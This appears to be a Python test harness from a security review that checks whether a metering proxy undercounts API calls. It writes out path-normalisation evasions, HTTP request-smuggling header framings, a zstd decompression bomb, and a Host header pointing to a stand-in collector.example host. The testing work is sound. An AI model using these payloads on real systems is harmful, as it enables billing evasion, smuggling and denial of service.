"""#401's requests that slip past the count, sent from inside c1 through the whole boundary.
Run with run/in.sh in c1 (CONNECT through the relay). Prints one line per request: what the
program got back. What reached the provider and what the boundary counted are read afterwards
from the run's ledger and trace (run/hostile.sh).

The spellings of the model routes and the header framings are #401's (`boundary/e2e.py`). The
stand-in provider routes a path by its end, so a spelling the boundary does not count is served
and billed, as the real hosts answered them (#401's `results/live-hosts.txt`).
"""
import json, os, socket, ssl, sys, time

CTX = ssl.create_default_context(cafile=os.environ["CA"])
ANTH, OPENAI = os.environ["ANTH"], os.environ["OPENAI"]
KEY = {"api.anthropic.com": f"x-api-key: {ANTH}", "api.openai.com": f"authorization: Bearer {OPENAI}"}
BODY = {"api.anthropic.com": b'{"model":"claude-opus-5-5","max_tokens":16,"messages":[{"role":"user","content":"hi"}]}',
        "api.openai.com": b'{"model":"gpt-6.2-sol","max_output_tokens":16,"input":"hi"}'}


def conn(host):
    s = socket.create_connection(("127.0.0.1", 3128), timeout=30)
    s.sendall(f"CONNECT {host}:443 HTTP/1.1\r\nhost: {host}:443\r\n\r\n".encode())
    b = b""
    while b"\r\n\r\n" not in b:
        b += s.recv(1)
    return CTX.wrap_socket(s, server_hostname=host)


def recv_all(s, t=5.0):
    s.settimeout(t)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except (socket.timeout, ssl.SSLError, ConnectionResetError):
        pass
    return out


def send(name, host, raw):
    t0 = time.time()
    try:
        s = conn(host)
        s.sendall(raw)
        r = recv_all(s)
        s.close()
        first = r.split(b"\r\n", 1)[0].decode(errors="replace") or "(closed, nothing back)"
    except Exception as e:  # noqa: BLE001
        first = f"(error {type(e).__name__})"
    print(json.dumps({"case": name, "got": first, "ms": round((time.time() - t0) * 1000, 1)}), flush=True)


def call(host, target, head_extra="", body=None):
    body = BODY[host] if body is None else body
    return (f"POST {target} HTTP/1.1\r\nhost: {host}\r\n{KEY[host]}\r\ncontent-type: application/json\r\n{head_extra}"
            f"content-length: {len(body)}\r\nconnection: close\r\n\r\n").encode() + body


# A call spelt the way the boundary counts it, as a control.
send("control /v1/messages", "api.anthropic.com", call("api.anthropic.com", "/v1/messages"))
for t in ["https://api.anthropic.com/v1/messages", "//v1/messages", "/v1//messages", "/v1/./messages", "/v1/x/../messages", "/%761/messages"]:
    send("path " + t, "api.anthropic.com", call("api.anthropic.com", t))
for t in ["//v1/responses", "/v1/./responses"]:
    send("path " + t, "api.openai.com", call("api.openai.com", t))
# Header framings a host reads otherwise than the boundary did (#401 finding 2).
b = BODY["api.anthropic.com"]
send("bare LF before transfer-encoding", "api.anthropic.com",
     f"POST /v1/messages HTTP/1.1\r\nhost: api.anthropic.com\r\n{KEY['api.anthropic.com']}\r\nx-pad: a\ntransfer-encoding: chunked\r\ncontent-length: {len(b)}\r\n\r\n".encode() + b)
send("folded content-length", "api.anthropic.com",
     f"POST /v1/messages HTTP/1.1\r\nhost: api.anthropic.com\r\n{KEY['api.anthropic.com']}\r\nx-pad: a\r\n content-length: 98\r\ncontent-length: {len(b)}\r\n\r\n".encode() + b)
send("space before colon", "api.anthropic.com",
     f"POST /v1/messages HTTP/1.1\r\nhost: api.anthropic.com\r\n{KEY['api.anthropic.com']}\r\ncontent-length : {len(b)}\r\n\r\n".encode() + b)
send("content-length with _", "api.anthropic.com",
     f"POST /v1/messages HTTP/1.1\r\nhost: api.anthropic.com\r\n{KEY['api.anthropic.com']}\r\ncontent-length: 1_0\r\n\r\n".encode() + b[:10])
# 64 KiB of zstd that unpacks to 2 GiB (#401 finding 3).
try:
    import zstandard
    bomb = zstandard.ZstdCompressor(level=19).compress(b'{"model":"claude-opus-5-5","max_tokens":16,"messages":[],"pad":"' + b" " * (2 << 30) + b'"}') if os.environ.get("BOMB_FULL") else None
except ImportError:
    bomb = None
if bomb is None:
    # Built in pieces so the sender need not hold 2 GiB: a stream of frames of spaces.
    import zstandard
    c = zstandard.ZstdCompressor(level=19)
    chunk = c.compress(b" " * (64 << 20))
    bomb = c.compress(b'{"model":"claude-opus-5-5","max_tokens":16,"messages":[],"pad":"') + chunk * 32 + c.compress(b'"}')
send(f"zstd body of {len(bomb) // 1024} KiB unpacking to 2 GiB", "api.anthropic.com",
     f"POST /v1/messages HTTP/1.1\r\nhost: api.anthropic.com\r\n{KEY['api.anthropic.com']}\r\ncontent-type: application/json\r\ncontent-encoding: zstd\r\ncontent-length: {len(bomb)}\r\nconnection: close\r\n\r\n".encode() + bomb)
# The TLS name and the Host header naming different hosts (#401 finding 5, for #379's swap).
send("Host header names another host than TLS", "api.anthropic.com",
     f"POST /v1/messages HTTP/1.1\r\nhost: collector.example\r\n{KEY['api.anthropic.com']}\r\ncontent-type: application/json\r\ncontent-length: {len(b)}\r\nconnection: close\r\n\r\n".encode() + b)
